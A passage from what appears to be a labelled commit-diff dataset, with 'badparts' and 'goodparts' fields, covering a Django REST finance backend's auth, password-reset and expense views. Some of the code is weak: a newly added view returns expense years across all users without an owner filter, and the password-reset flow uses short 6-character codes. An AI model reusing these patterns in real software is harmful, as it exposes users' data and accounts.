serializer.validated_data['pref_coin_type'],\n-                    serializer.validated_data['expected_annual_balance']\n-                )\n-            if 'expected_monthly_balance' in serializer.validated_data:\n-                serializer.validated_data['expected_monthly_balance'] = convert_or_fetch(\n-                    serializer.instance.pref_coin_type, \n-                    serializer.validated_data['pref_coin_type'],\n-                    serializer.validated_data['expected_monthly_balance']\n-                )\n-        serializer.save()\n \n class CodeView(generics.CreateAPIView):\n     permission_classes = (AllowAny,)\n","add":4,"remove":54,"filename":"\/backend\/djangorest\/custom_auth\/api\/views.py","badparts":["from coin.currency_converter_integration import convert_or_fetch","from custom_auth.api.serializers.jwt_code_serializers import (","    CodeSerializer, ","    CodeVerificationSerializer, ","    CustomTokenObtainPairSerializer, ","    CustomTokenRefreshSerializer",")","from rest_framework.parsers import FormParser, MultiPartParser, JSONParser","from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView","from custom_auth.api.serializers.user_serializers import (","    UserCreationSerializer,","    UserRetrieveUpdateDestroySerializer","class UserCreationView(generics.CreateAPIView):","    queryset = User.objects.all()","    permission_classes = (AllowAny,)","    serializer_class = UserCreationSerializer","    parser_classes = (FormParser, JSONParser,)","class UserRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView):","    queryset = User.objects.all()","    permission_classes = (IsCurrentVerifiedUser,)","    serializer_class = UserRetrieveUpdateDestroySerializer","    parser_classes = (MultiPartParser, FormParser, JSONParser)","    def get_object(self, queryset=None):","        return self.request.user","    def perform_update(self, serializer):","        if 'email' in serializer.validated_data:","            serializer.validated_data['verified'] = False","        if 'pref_coin_type' in serializer.validated_data:","            if 'balance' in serializer.validated_data:","                serializer.validated_data['balance'] = convert_or_fetch(","                    serializer.instance.pref_coin_type, ","                    serializer.validated_data['pref_coin_type'],","                    serializer.validated_data['balance']","                )","            if 'expected_annual_balance' in serializer.validated_data:","                serializer.validated_data['expected_annual_balance'] = convert_or_fetch(","                    serializer.instance.pref_coin_type, ","                    serializer.validated_data['pref_coin_type'],","                    serializer.validated_data['expected_annual_balance']","                )","            if 'expected_monthly_balance' in serializer.validated_data:","                serializer.validated_data['expected_monthly_balance'] = convert_or_fetch(","                    serializer.instance.pref_coin_type, ","                    serializer.validated_data['pref_coin_type'],","                    serializer.validated_data['expected_monthly_balance']","                )","        serializer.save()"],"goodparts":["from rest_framework.parsers import JSONParser","from custom_auth.api.serializers.code_serializers import (","    CodeSerializer, ","    CodeVerificationSerializer,"]},{"diff":"\n     serializer_class = CodeVerificationSerializer\n     parser_classes = (JSONParser,)\n \n-class CustomTokenObtainPairView(TokenObtainPairView):\n-    permission_classes = (AllowAny,)\n-    serializer_class = CustomTokenObtainPairSerializer\n-    parser_classes = (JSONParser,)\n-\n-class CustomTokenRefreshView(TokenRefreshView):\n-    \"\"\"\n-    Refresh token generator view.\n-    \"\"\"\n-    serializer_class = CustomTokenRefreshSerializer\n-\n class ChangePasswordView(generics.CreateAPIView): \n     \"\"\"\n     An endpoint fo","add":0,"remove":11,"filename":"\/backend\/djangorest\/custom_auth\/api\/views.py","badparts":["class CustomTokenObtainPairView(TokenObtainPairView):","    permission_classes = (AllowAny,)","    serializer_class = CustomTokenObtainPairSerializer","    parser_classes = (JSONParser,)","class CustomTokenRefreshView(TokenRefreshView):","    \"\"\"","    Refresh token generator view.","    \"\"\"","    serializer_class = CustomTokenRefreshSerializer"],"goodparts":[]}],"source":"\nimport os from coin.currency_converter_integration import convert_or_fetch from core.permissions import IsCurrentVerifiedUser from custom_auth.models import User from custom_auth.api.serializers.jwt_code_serializers import( CodeSerializer, CodeVerificationSerializer, CustomTokenObtainPairSerializer, CustomTokenRefreshSerializer ) from rest_framework import generics, status, mixins from rest_framework.parsers import FormParser, MultiPartParser, JSONParser from rest_framework.permissions import AllowAny from rest_framework.response import Response from rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView from custom_auth.api.serializers.user_serializers import( ChangePasswordSerializer, ResetPasswordStartSerializer, ResetPasswordVerifySerializer, UserCreationSerializer, UserRetrieveUpdateDestroySerializer ) from custom_auth.tasks import send_password_code from django.utils.timezone import now from django.utils.translation import gettext_lazy as _ from django.utils.translation import get_language class UserCreationView(generics.CreateAPIView): queryset=User.objects.all() permission_classes=(AllowAny,) serializer_class=UserCreationSerializer parser_classes=(FormParser, JSONParser,) class UserRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView): queryset=User.objects.all() permission_classes=(IsCurrentVerifiedUser,) serializer_class=UserRetrieveUpdateDestroySerializer parser_classes=(MultiPartParser, FormParser, JSONParser) def get_object(self, queryset=None): return self.request.user def perform_update(self, serializer): if 'email' in serializer.validated_data: serializer.validated_data['verified']=False if 'pref_coin_type' in serializer.validated_data: if 'balance' in serializer.validated_data: serializer.validated_data['balance']=convert_or_fetch( serializer.instance.pref_coin_type, serializer.validated_data['pref_coin_type'], serializer.validated_data['balance'] ) if 'expected_annual_balance' in serializer.validated_data: serializer.validated_data['expected_annual_balance']=convert_or_fetch( serializer.instance.pref_coin_type, serializer.validated_data['pref_coin_type'], serializer.validated_data['expected_annual_balance'] ) if 'expected_monthly_balance' in serializer.validated_data: serializer.validated_data['expected_monthly_balance']=convert_or_fetch( serializer.instance.pref_coin_type, serializer.validated_data['pref_coin_type'], serializer.validated_data['expected_monthly_balance'] ) serializer.save() class CodeView(generics.CreateAPIView): permission_classes=(AllowAny,) serializer_class=CodeSerializer parser_classes=(JSONParser,) class CodeVerificationView(generics.CreateAPIView): permission_classes=(AllowAny,) serializer_class=CodeVerificationSerializer parser_classes=(JSONParser,) class CustomTokenObtainPairView(TokenObtainPairView): permission_classes=(AllowAny,) serializer_class=CustomTokenObtainPairSerializer parser_classes=(JSONParser,) class CustomTokenRefreshView(TokenRefreshView): \"\"\" Refresh token generator view. \"\"\" serializer_class=CustomTokenRefreshSerializer class ChangePasswordView(generics.CreateAPIView): \"\"\" An endpoint for changing password \"\"\" serializer_class=ChangePasswordSerializer permission_classes=(IsCurrentVerifiedUser,) parser_classes=(JSONParser,) def get_object(self, queryset=None): return self.request.user def create(self, request, *args, **kwargs): self.user=self.get_object() serializer=self.get_serializer(data=request.data) if serializer.is_valid(): self.user.set_password(serializer.data[\"new_password\"]) self.user.save() return Response({}, status.HTTP_200_OK) return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST) class ResetPasswordStartView(generics.GenericAPIView, mixins.CreateModelMixin, mixins.RetrieveModelMixin): \"\"\" An endpoint for password reset start \"\"\" serializer_class=ResetPasswordStartSerializer permission_classes=(AllowAny,) parser_classes=(JSONParser,) def post(self, request, *args, **kwargs): serializer=self.get_serializer(data=request.data) if serializer.is_valid(): code=os.urandom(3).hex() user=User.objects.get(email=serializer.data[\"email\"]) user.pass_reset=code user.date_pass_reset=now() send_password_code.delay(code, user.email, get_language()) user.save() return Response({}, status.HTTP_200_OK) return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST) class ResetPasswordVerifyView(generics.GenericAPIView, mixins.CreateModelMixin, mixins.RetrieveModelMixin): \"\"\" An endpoint for password reset verify \"\"\" serializer_class=ResetPasswordVerifySerializer permission_classes=(AllowAny,) parser_classes=(JSONParser,) def post(self, request, *args, **kwargs): serializer=self.get_serializer(data=request.data) if serializer.is_valid(): user=User.objects.get(email=serializer.data[\"email\"]) user.set_password(serializer.data[\"new_password\"]) user.save() return Response({}, status.HTTP_200_OK) return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST) ","sourceWithComments":"import os\nfrom coin.currency_converter_integration import convert_or_fetch\nfrom core.permissions import IsCurrentVerifiedUser\nfrom custom_auth.models import User\nfrom custom_auth.api.serializers.jwt_code_serializers import (\n    CodeSerializer, \n    CodeVerificationSerializer, \n    CustomTokenObtainPairSerializer, \n    CustomTokenRefreshSerializer\n)\nfrom rest_framework import generics, status, mixins\nfrom rest_framework.parsers import FormParser, MultiPartParser, JSONParser\nfrom rest_framework.permissions import AllowAny\nfrom rest_framework.response import Response\nfrom rest_framework_simplejwt.views import TokenObtainPairView, TokenRefreshView\nfrom custom_auth.api.serializers.user_serializers import (\n    ChangePasswordSerializer,\n    ResetPasswordStartSerializer,\n    ResetPasswordVerifySerializer,\n    UserCreationSerializer,\n    UserRetrieveUpdateDestroySerializer\n)\nfrom custom_auth.tasks import send_password_code\nfrom django.utils.timezone import now\nfrom django.utils.translation import gettext_lazy as _\nfrom django.utils.translation import get_language\n\nclass UserCreationView(generics.CreateAPIView):\n    queryset = User.objects.all()\n    permission_classes = (AllowAny,)\n    serializer_class = UserCreationSerializer\n    parser_classes = (FormParser, JSONParser,)\n\nclass UserRetrieveUpdateDestroyView(generics.RetrieveUpdateDestroyAPIView):\n    queryset = User.objects.all()\n    permission_classes = (IsCurrentVerifiedUser,)\n    serializer_class = UserRetrieveUpdateDestroySerializer\n    parser_classes = (MultiPartParser, FormParser, JSONParser)\n    \n    def get_object(self, queryset=None):\n        return self.request.user\n    \n    def perform_update(self, serializer):\n        if 'email' in serializer.validated_data:\n            serializer.validated_data['verified'] = False\n        # The user balance should only be converted if\n        # the same balance is provided in the request\n        # and the pref_coin_type is changed, same for\n        # expected_annual_balance and expected_monthly_balance\n        if 'pref_coin_type' in serializer.validated_data:\n            if 'balance' in serializer.validated_data:\n                serializer.validated_data['balance'] = convert_or_fetch(\n                    serializer.instance.pref_coin_type, \n                    serializer.validated_data['pref_coin_type'],\n                    serializer.validated_data['balance']\n                )\n            if 'expected_annual_balance' in serializer.validated_data:\n                serializer.validated_data['expected_annual_balance'] = convert_or_fetch(\n                    serializer.instance.pref_coin_type, \n                    serializer.validated_data['pref_coin_type'],\n                    serializer.validated_data['expected_annual_balance']\n                )\n            if 'expected_monthly_balance' in serializer.validated_data:\n                serializer.validated_data['expected_monthly_balance'] = convert_or_fetch(\n                    serializer.instance.pref_coin_type, \n                    serializer.validated_data['pref_coin_type'],\n                    serializer.validated_data['expected_monthly_balance']\n                )\n        serializer.save()\n\nclass CodeView(generics.CreateAPIView):\n    permission_classes = (AllowAny,)\n    serializer_class = CodeSerializer\n    parser_classes = (JSONParser,)\n\nclass CodeVerificationView(generics.CreateAPIView):\n    permission_classes = (AllowAny,)\n    serializer_class = CodeVerificationSerializer\n    parser_classes = (JSONParser,)\n\nclass CustomTokenObtainPairView(TokenObtainPairView):\n    permission_classes = (AllowAny,)\n    serializer_class = CustomTokenObtainPairSerializer\n    parser_classes = (JSONParser,)\n\nclass CustomTokenRefreshView(TokenRefreshView):\n    \"\"\"\n    Refresh token generator view.\n    \"\"\"\n    serializer_class = CustomTokenRefreshSerializer\n\nclass ChangePasswordView(generics.CreateAPIView): \n    \"\"\"\n    An endpoint for changing password\n    \"\"\"  \n    serializer_class = ChangePasswordSerializer\n    permission_classes = (IsCurrentVerifiedUser,)\n    parser_classes = (JSONParser,)\n\n    def get_object(self, queryset=None):\n        return self.request.user\n\n    def create(self, request, *args, **kwargs):\n        self.user = self.get_object()\n        serializer = self.get_serializer(data=request.data)\n        if serializer.is_valid():\n            self.user.set_password(serializer.data[\"new_password\"])\n            self.user.save()\n            return Response({}, status.HTTP_200_OK)\n        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)\n\nclass ResetPasswordStartView(generics.GenericAPIView, mixins.CreateModelMixin, \n    mixins.RetrieveModelMixin):\n    \"\"\"\n    An endpoint for password reset start\n    \"\"\"\n    serializer_class = ResetPasswordStartSerializer\n    permission_classes = (AllowAny,)\n    parser_classes = (JSONParser,)\n\n    def post(self, request, *args, **kwargs):\n        serializer = self.get_serializer(data=request.data)\n        if serializer.is_valid():\n            code = os.urandom(3).hex()\n            user = User.objects.get(email=serializer.data[\"email\"])\n            user.pass_reset = code\n            user.date_pass_reset = now()\n            send_password_code.delay(code, user.email, get_language())\n            user.save()\n            return Response({}, status.HTTP_200_OK)\n        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)\n\nclass ResetPasswordVerifyView(generics.GenericAPIView, mixins.CreateModelMixin, \n    mixins.RetrieveModelMixin):\n    \"\"\"\n    An endpoint for password reset verify\n    \"\"\"\n    serializer_class = ResetPasswordVerifySerializer\n    permission_classes = (AllowAny,)\n    parser_classes = (JSONParser,)\n\n    def post(self, request, *args, **kwargs):\n        serializer = self.get_serializer(data=request.data)\n        if serializer.is_valid():\n            user = User.objects.get(email=serializer.data[\"email\"])\n            user.set_password(serializer.data[\"new_password\"])\n            user.save()\n            return Response({}, status.HTTP_200_OK)\n        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)"},"\/backend\/djangorest\/custom_auth\/migrations\/0001_initial.py":{"changes":[{"diff":"\n     initial = True\n \n     dependencies = [\n-        ('auth', '0012_alter_user_first_name_max_length'),\n         ('coin', '0001_initial'),\n+        ('auth', '0012_alter_user_first_name_max_length'),\n     ]","add":1,"remove":1,"filename":"\/backend\/djangorest\/custom_auth\/migrations\/0001_initial.py","badparts":["        ('auth', '0012_alter_user_first_name_max_length'),"],"goodparts":["        ('auth', '0012_alter_user_first_name_max_length'),"]}],"source":"\n import custom_auth.models import django.contrib.auth.validators import django.core.validators from django.db import migrations, models import django.db.models.deletion import django.utils.timezone import uuid class Migration(migrations.Migration): initial=True dependencies=[ ('auth', '0012_alter_user_first_name_max_length'), ('coin', '0001_initial'), ] operations=[ migrations.CreateModel( name='InvitationCode', fields=[ ('code', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False, verbose_name='uuid code')), ('usage_left', models.PositiveIntegerField(default=1, verbose_name='usage left')), ('is_active', models.BooleanField(default=True, verbose_name='is active')), ('created', models.DateTimeField(auto_now_add=True)), ('updated', models.DateTimeField(auto_now_add=True)), ], options={ 'verbose_name': 'Invitation code', 'verbose_name_plural': 'Invitation codes', 'ordering':['-usage_left'], }, ), migrations.CreateModel( name='User', fields=[ ('password', models.CharField(max_length=128, verbose_name='password')), ('last_login', models.DateTimeField(blank=True, null=True, verbose_name='last login')), ('is_superuser', models.BooleanField(default=False, help_text='Designates that this user has all permissions without explicitly assigning them.', verbose_name='superuser status')), ('username', models.CharField(error_messages={'unique': 'A user with that username already exists.'}, help_text='Required. 150 characters or fewer. Letters, digits and @\/.\/+\/-\/_ only.', max_length=150, unique=True, validators=[django.contrib.auth.validators.UnicodeUsernameValidator()], verbose_name='username')), ('is_staff', models.BooleanField(default=False, help_text='Designates whether the user can log into this admin site.', verbose_name='staff status')), ('is_active', models.BooleanField(default=True, help_text='Designates whether this user should be treated as active. Unselect this instead of deleting accounts.', verbose_name='active')), ('date_joined', models.DateTimeField(default=django.utils.timezone.now, verbose_name='date joined')), ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)), ('email', models.EmailField(max_length=254, unique=True, verbose_name='email address')), ('language', models.CharField(default='en', max_length=2, validators=[django.core.validators.MinLengthValidator(2)], verbose_name='language')), ('image', models.ImageField(default='users\/default_user.jpg', upload_to=custom_auth.models._image_user_dir, verbose_name='profile image')), ('balance', models.FloatField(default=0.0, verbose_name='current balance')), ('receive_email_balance', models.BooleanField(default=True, verbose_name='receive email about balance')), ('expected_annual_balance', models.FloatField(default=0.0, validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='expected annual balance')), ('expected_monthly_balance', models.FloatField(default=0.0, validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='expected monthly balance')), ('verified', models.BooleanField(default=False, verbose_name='verified')), ('code_sent', models.CharField(blank=True, max_length=6, null=True, validators=[django.core.validators.MinLengthValidator(6)], verbose_name='last code sent')), ('date_code_sent', models.DateTimeField(blank=True, null=True, verbose_name='date of last code sent')), ('pass_reset', models.CharField(blank=True, max_length=6, null=True, validators=[django.core.validators.MinLengthValidator(6)], verbose_name='last password reset code sent')), ('date_pass_reset', models.DateTimeField(blank=True, null=True, verbose_name='date of last password reset code sent')), ('groups', models.ManyToManyField(blank=True, help_text='The groups this user belongs to. A user will get all permissions granted to each of their groups.', related_name='user_set', related_query_name='user', to='auth.group', verbose_name='groups')), ('inv_code', models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='custom_auth.invitationcode', verbose_name='invitation code')), ('pref_coin_type', models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='coin.cointype', verbose_name='preferred coin type')), ('user_permissions', models.ManyToManyField(blank=True, help_text='Specific permissions for this user.', related_name='user_set', related_query_name='user', to='auth.permission', verbose_name='user permissions')), ], options={ 'verbose_name': 'user', 'verbose_name_plural': 'users', 'abstract': False, }, managers=[ ('objects', custom_auth.models.BalanceUserManager()), ], ), ] ","sourceWithComments":"# Generated by Django 4.0.7 on 2022-10-22 21:39\n\nimport custom_auth.models\nimport django.contrib.auth.validators\nimport django.core.validators\nfrom django.db import migrations, models\nimport django.db.models.deletion\nimport django.utils.timezone\nimport uuid\n\n\nclass Migration(migrations.Migration):\n\n    initial = True\n\n    dependencies = [\n        ('auth', '0012_alter_user_first_name_max_length'),\n        ('coin', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='InvitationCode',\n            fields=[\n                ('code', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False, verbose_name='uuid code')),\n                ('usage_left', models.PositiveIntegerField(default=1, verbose_name='usage left')),\n                ('is_active', models.BooleanField(default=True, verbose_name='is active')),\n                ('created', models.DateTimeField(auto_now_add=True)),\n                ('updated', models.DateTimeField(auto_now_add=True)),\n            ],\n            options={\n                'verbose_name': 'Invitation code',\n                'verbose_name_plural': 'Invitation codes',\n                'ordering': ['-usage_left'],\n            },\n        ),\n        migrations.CreateModel(\n            name='User',\n            fields=[\n                ('password', models.CharField(max_length=128, verbose_name='password')),\n                ('last_login', models.DateTimeField(blank=True, null=True, verbose_name='last login')),\n                ('is_superuser', models.BooleanField(default=False, help_text='Designates that this user has all permissions without explicitly assigning them.', verbose_name='superuser status')),\n                ('username', models.CharField(error_messages={'unique': 'A user with that username already exists.'}, help_text='Required. 150 characters or fewer. Letters, digits and @\/.\/+\/-\/_ only.', max_length=150, unique=True, validators=[django.contrib.auth.validators.UnicodeUsernameValidator()], verbose_name='username')),\n                ('is_staff', models.BooleanField(default=False, help_text='Designates whether the user can log into this admin site.', verbose_name='staff status')),\n                ('is_active', models.BooleanField(default=True, help_text='Designates whether this user should be treated as active. Unselect this instead of deleting accounts.', verbose_name='active')),\n                ('date_joined', models.DateTimeField(default=django.utils.timezone.now, verbose_name='date joined')),\n                ('id', models.UUIDField(default=uuid.uuid4, editable=False, primary_key=True, serialize=False)),\n                ('email', models.EmailField(max_length=254, unique=True, verbose_name='email address')),\n                ('language', models.CharField(default='en', max_length=2, validators=[django.core.validators.MinLengthValidator(2)], verbose_name='language')),\n                ('image', models.ImageField(default='users\/default_user.jpg', upload_to=custom_auth.models._image_user_dir, verbose_name='profile image')),\n                ('balance', models.FloatField(default=0.0, verbose_name='current balance')),\n                ('receive_email_balance', models.BooleanField(default=True, verbose_name='receive email about balance')),\n                ('expected_annual_balance', models.FloatField(default=0.0, validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='expected annual balance')),\n                ('expected_monthly_balance', models.FloatField(default=0.0, validators=[django.core.validators.MinValueValidator(0.0)], verbose_name='expected monthly balance')),\n                ('verified', models.BooleanField(default=False, verbose_name='verified')),\n                ('code_sent', models.CharField(blank=True, max_length=6, null=True, validators=[django.core.validators.MinLengthValidator(6)], verbose_name='last code sent')),\n                ('date_code_sent', models.DateTimeField(blank=True, null=True, verbose_name='date of last code sent')),\n                ('pass_reset', models.CharField(blank=True, max_length=6, null=True, validators=[django.core.validators.MinLengthValidator(6)], verbose_name='last password reset code sent')),\n                ('date_pass_reset', models.DateTimeField(blank=True, null=True, verbose_name='date of last password reset code sent')),\n                ('groups', models.ManyToManyField(blank=True, help_text='The groups this user belongs to. A user will get all permissions granted to each of their groups.', related_name='user_set', related_query_name='user', to='auth.group', verbose_name='groups')),\n                ('inv_code', models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='custom_auth.invitationcode', verbose_name='invitation code')),\n                ('pref_coin_type', models.ForeignKey(blank=True, null=True, on_delete=django.db.models.deletion.DO_NOTHING, to='coin.cointype', verbose_name='preferred coin type')),\n                ('user_permissions', models.ManyToManyField(blank=True, help_text='Specific permissions for this user.', related_name='user_set', related_query_name='user', to='auth.permission', verbose_name='user permissions')),\n            ],\n            options={\n                'verbose_name': 'user',\n                'verbose_name_plural': 'users',\n                'abstract': False,\n            },\n            managers=[\n                ('objects', custom_auth.models.BalanceUserManager()),\n            ],\n        ),\n    ]\n"},"\/backend\/djangorest\/expense\/api\/urls.py":{"changes":[{"diff":"\n from expense.api.views import (\n     ExpenseView, \n     ExpenseTypeRetrieveView, \n-    ExpenseTypeListView\n+    ExpenseTypeListView,\n+    EspenseYearsRetrieveView\n )\n from rest_framework import routers\n \n","add":2,"remove":1,"filename":"\/backend\/djangorest\/expense\/api\/urls.py","badparts":["    ExpenseTypeListView"],"goodparts":["    ExpenseTypeListView,","    EspenseYearsRetrieveView"]}],"source":"\nfrom django.urls import path, include from expense.api.views import( ExpenseView, ExpenseTypeRetrieveView, ExpenseTypeListView ) from rest_framework import routers router=routers.DefaultRouter(trailing_slash=False) router.register('expense', ExpenseView) urlpatterns=[ path(\"expense\/type\/<str:pk>\", ExpenseTypeRetrieveView.as_view(), name='exp_type_get'), path(\"expense\/type\", ExpenseTypeListView.as_view(), name='exp_type_list'), path(\"\", include(router.urls)), ] ","sourceWithComments":"from django.urls import path, include\nfrom expense.api.views import (\n    ExpenseView, \n    ExpenseTypeRetrieveView, \n    ExpenseTypeListView\n)\nfrom rest_framework import routers\n\n# trailing_slash=False erase the '\/' character at the end of the url\nrouter = routers.DefaultRouter(trailing_slash=False)\nrouter.register('expense', ExpenseView)\n\n\nurlpatterns = [\n    path(\"expense\/type\/<str:pk>\", ExpenseTypeRetrieveView.as_view(), name='exp_type_get'),\n    path(\"expense\/type\", ExpenseTypeListView.as_view(), name='exp_type_list'),\n    path(\"\", include(router.urls)),\n]"},"\/backend\/djangorest\/expense\/api\/views.py":{"changes":[{"diff":"\n             - converted_quantity, owner,\n             instance.date.year, instance.date.month, False\n         )\n-        instance.delete()\n\\ No newline at end of file\n+        instance.delete()\n+\n+class EspenseYearsRetrieveView(APIView):\n+    permission_classes = (IsCurrentVerifiedUser,)\n+    \n+    @method_decorator(cache_page(60))\n+    @method_decorator(vary_on_headers(\"Authorization\"))\n+    def get(self, request, format=None):\n+        \"\"\"\n+        This view will be cached for 1 minute\n+        \"\"\"\n+        expenses = list(Expense.objects.all())\n+        if expenses:\n+            return Response(\n+                data={\"years\": list(set([\n+                    exp.date.year for exp in expenses\n+                ]))},\n+            )\n+        return Response(\n+            data={\"years\": [date.to","add":20,"remove":1,"filename":"\/backend\/djangorest\/expense\/api\/views.py","badparts":[" converted_quantity, owner,","        instance.delete()"],"goodparts":["        instance.delete()","class EspenseYearsRetrieveView(APIView):","    permission_classes = (IsCurrentVerifiedUser,)","    @method_decorator(cache_page(60))","    @method_decorator(vary_on_headers(\"Authorization\"))","    def get(self, request, format=None):","        \"\"\"","        This view will be cached for 1 minute","        \"\"\"","        expenses = list(Expense.objects.all())","        if expenses:","            return Response(","                data={\"years\": list(set([","                    exp.date.year for exp in expenses","                ]))},","            )","        return Response(","            data={\"years\": [date.to"]}],"source":"\nfrom rest_framework import viewsets from balance.utils import( check_dates_and_update_date_balances, update_or_create_annual_balance, update_or_create_monthly_balance ) from expense.models import Expense, ExpenseType from expense.api.serializers import( ExpenseTypeSerializer, ExpensePostPutDelSerializer, ExpenseListDetailSerializer ) from core.permissions import IsCurrentVerifiedUser from rest_framework.permissions import IsAuthenticated from expense.api.filters import ExpenseFilterSet from rest_framework import generics from coin.currency_converter_integration import convert_or_fetch from django.utils.decorators import method_decorator from django.views.decorators.cache import cache_page from django.views.decorators.vary import vary_on_headers class ExpenseTypeRetrieveView(generics.RetrieveAPIView): queryset=ExpenseType.objects.all() permission_classes=(IsAuthenticated,) serializer_class=ExpenseTypeSerializer @method_decorator(cache_page(12 * 60 * 60)) @method_decorator(vary_on_headers(\"Authorization\")) def get(self, request, *args, **kwargs): \"\"\" This view will be cached for 12 hours \"\"\" return super(ExpenseTypeRetrieveView, self).get(request, *args, **kwargs) class ExpenseTypeListView(generics.ListAPIView): queryset=ExpenseType.objects.all() permission_classes=(IsAuthenticated,) serializer_class=ExpenseTypeSerializer @method_decorator(cache_page(12 * 60 * 60)) @method_decorator(vary_on_headers(\"Authorization\")) def get(self, request, *args, **kwargs): \"\"\" This view will be cached for 12 hours \"\"\" return super(ExpenseTypeListView, self).get(request, *args, **kwargs) class ExpenseView(viewsets.ModelViewSet): queryset=Expense.objects.all() permission_classes=(IsCurrentVerifiedUser,) filterset_class=ExpenseFilterSet def get_queryset(self): \"\"\" Filter objects by owner \"\"\" if getattr(self, 'swagger_fake_view', False): return Expense.objects.none() return Expense.objects.filter(owner=self.request.user) def get_serializer_class(self): if self.request.method=='GET': return ExpenseListDetailSerializer return ExpensePostPutDelSerializer def perform_create(self, serializer): owner=self.request.user if serializer.validated_data.get('quantity'): coin_from=serializer.validated_data['coin_type'] coin_to=owner.pref_coin_type amount=serializer.validated_data['quantity'] coverted_quantity=convert_or_fetch(coin_from, coin_to, amount) owner.balance -=coverted_quantity owner.balance=round(owner.balance, 2) owner.save() update_or_create_annual_balance( coverted_quantity, owner, serializer.validated_data['date'].year, False ) update_or_create_monthly_balance( coverted_quantity, owner, serializer.validated_data['date'].year, serializer.validated_data['date'].month, False ) serializer.save(owner=owner) def perform_update(self, serializer): owner=self.request.user if serializer.validated_data.get('quantity'): if not serializer.validated_data.get('coin_type'): coin_from=serializer.instance.coin_type else: coin_from=serializer.validated_data['coin_type'] coin_to=owner.pref_coin_type quantity=serializer.validated_data['quantity'] converted_new_quantity=convert_or_fetch( coin_from, coin_to, quantity ) converted_old_quantity=convert_or_fetch( serializer.instance.coin_type, coin_to, serializer.instance.quantity ) owner.balance -=converted_new_quantity \\ -converted_old_quantity owner.balance=round(owner.balance, 2) owner.save() check_dates_and_update_date_balances( serializer.instance, converted_old_quantity, converted_new_quantity, serializer.validated_data.get('date') ) elif serializer.validated_data.get('date'): coin_from=serializer.validated_data['coin_type'] \\ if serializer.validated_data.get('coin_type') \\ else serializer.instance.coin_type converted_quantity=convert_or_fetch( coin_from, owner.pref_coin_type, serializer.instance.quantity ) check_dates_and_update_date_balances( serializer.instance, converted_quantity, None, serializer.validated_data['date'] ) serializer.save() def perform_destroy(self, instance): owner=self.request.user coin_to=owner.pref_coin_type converted_quantity=convert_or_fetch( instance.coin_type, coin_to, instance.quantity ) owner.balance +=converted_quantity owner.balance=round(owner.balance, 2) owner.save() update_or_create_annual_balance( -converted_quantity, owner, instance.date.year, False ) update_or_create_monthly_balance( -converted_quantity, owner, instance.date.year, instance.date.month, False ) instance.delete() ","sourceWithComments":"from rest_framework import viewsets\nfrom balance.utils import (\n    check_dates_and_update_date_balances, \n    update_or_create_annual_balance, \n    update_or_create_monthly_balance\n)\nfrom expense.models import Expense, ExpenseType\nfrom expense.api.serializers import (\n    ExpenseTypeSerializer,\n    ExpensePostPutDelSerializer,\n    ExpenseListDetailSerializer\n)\nfrom core.permissions import IsCurrentVerifiedUser\nfrom rest_framework.permissions import IsAuthenticated\nfrom expense.api.filters import ExpenseFilterSet\nfrom rest_framework import generics\nfrom coin.currency_converter_integration import convert_or_fetch\nfrom django.utils.decorators import method_decorator\nfrom django.views.decorators.cache import cache_page\nfrom django.views.decorators.vary import vary_on_headers\n\n\nclass ExpenseTypeRetrieveView(generics.RetrieveAPIView):\n    queryset = ExpenseType.objects.all()\n    permission_classes = (IsAuthenticated,)\n    serializer_class = ExpenseTypeSerializer\n    \n    @method_decorator(cache_page(12 * 60 * 60))\n    @method_decorator(vary_on_headers(\"Authorization\"))\n    def get(self, request, *args, **kwargs):\n        \"\"\"\n        This view will be cached for 12 hours\n        \"\"\"\n        return super(ExpenseTypeRetrieveView, self).get(request, *args, **kwargs)\n\nclass ExpenseTypeListView(generics.ListAPIView):\n    queryset = ExpenseType.objects.all()\n    permission_classes = (IsAuthenticated,)\n    serializer_class = ExpenseTypeSerializer\n    \n    @method_decorator(cache_page(12 * 60 * 60))\n    @method_decorator(vary_on_headers(\"Authorization\"))\n    def get(self, request, *args, **kwargs):\n        \"\"\"\n        This view will be cached for 12 hours\n        \"\"\"\n        return super(ExpenseTypeListView, self).get(request, *args, **kwargs)\n\n\nclass ExpenseView(viewsets.ModelViewSet):\n    queryset = Expense.objects.all()\n    permission_classes = (IsCurrentVerifiedUser,)\n    filterset_class = ExpenseFilterSet\n\n    def get_queryset(self):\n        \"\"\"\n        Filter objects by owner\n        \"\"\"\n        if getattr(self, 'swagger_fake_view', False):\n            return Expense.objects.none()  # return empty queryset\n        return Expense.objects.filter(owner=self.request.user)\n    \n    def get_serializer_class(self):\n        if self.request.method == 'GET':\n            return ExpenseListDetailSerializer\n        return ExpensePostPutDelSerializer\n\n    def perform_create(self, serializer):\n        owner = self.request.user\n        # Change user balance according to quantity\n        if serializer.validated_data.get('quantity'):\n            coin_from = serializer.validated_data['coin_type']\n            coin_to = owner.pref_coin_type\n            amount = serializer.validated_data['quantity']\n            coverted_quantity = convert_or_fetch(coin_from, coin_to, amount)\n            owner.balance -= coverted_quantity\n            owner.balance = round(owner.balance, 2)\n            owner.save()\n            # Create AnnualBalance or update it\n            update_or_create_annual_balance(\n                coverted_quantity, owner,\n                serializer.validated_data['date'].year, False\n            )\n            # Create MonthlyBalance or update it\n            update_or_create_monthly_balance(\n                coverted_quantity, owner,\n                serializer.validated_data['date'].year,\n                serializer.validated_data['date'].month, False\n            )\n        # Inject owner data to the 